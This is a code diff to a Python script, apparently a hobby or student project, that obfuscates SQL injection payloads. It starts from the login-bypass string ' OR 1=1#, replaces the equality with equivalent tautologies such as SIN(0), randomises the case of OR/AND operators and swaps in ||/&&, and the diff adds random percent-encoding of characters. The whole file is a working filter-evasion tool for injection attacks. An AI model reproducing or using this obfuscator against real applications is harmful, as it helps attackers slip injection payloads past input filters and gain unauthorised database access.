@@ -7,7 +7,7 @@ print("Begin Obfuscator")
 
 SQLcommands = ['\' OR 1=1#']
 
-def modifyEquality(string):
+def modifyEquality(string):# I need to add something earlier to check if there are spaces before or after the equality such that I am missing terms. 
     sides=string.split("=")
     listOfTauts= ['0','2/2-1','8-8','COS(PI()/2)','SIN(0)']
         
@@ -25,9 +25,23 @@ def modifyEquality(string):
     #Randomly select value
     return str( sides[0]+"=" +sides[1])
     
+def replaceChars(string):
+    
+    i=0
+    while i < len(string):
+        flip = random.randint(0,1)#ChangeBased on likelyhood
+        if(flip==0):
+            numValue = format(ord(string[i]), "x")
+            outString = "%"+str(numValue) #Do I need a "+" here?
+            string = string[:i] + str(outString) + string[i+1:]
+            i+=len(outString)
+        i+=1
+    return string
+    
+    
 def changeLogicOperations (string): #Randomly chooses between written and signs, and adds extra meaningless extensions.
-    orValues=["OR","Or","or","oR","||"]
-    andValues=["AND","aNd","And","aND","and","&&"]
+    orValues=[" OR "," Or "," or "," oR "," || "]
+    andValues=[" AND "," aNd "," And "," aND "," and "," && "]
     
     for element in orValues:
         if (element in string):
@@ -69,7 +83,7 @@ def obfuscateCommand(string):
                     print("Term is "+str(removedHash))
                     loopTemp+=" "+str(modifyEquality(removedHash))+postHash
                 else:
-                    loopTemp+=removedHash +postHash
+                    loopTemp+=removedHash +postHash+" "
         else:
             loopTemp=str(sections[i])
             
@@ -94,4 +108,7 @@ def obfuscateCommand(string):
 print(random.randint(0,1))
 outputCommand = obfuscateCommand(sys.argv[1])
 
+print(outputCommand)
+percentObfs= replaceChars(outputCommand)
+print(percentObfs)
 print(outputCommand)
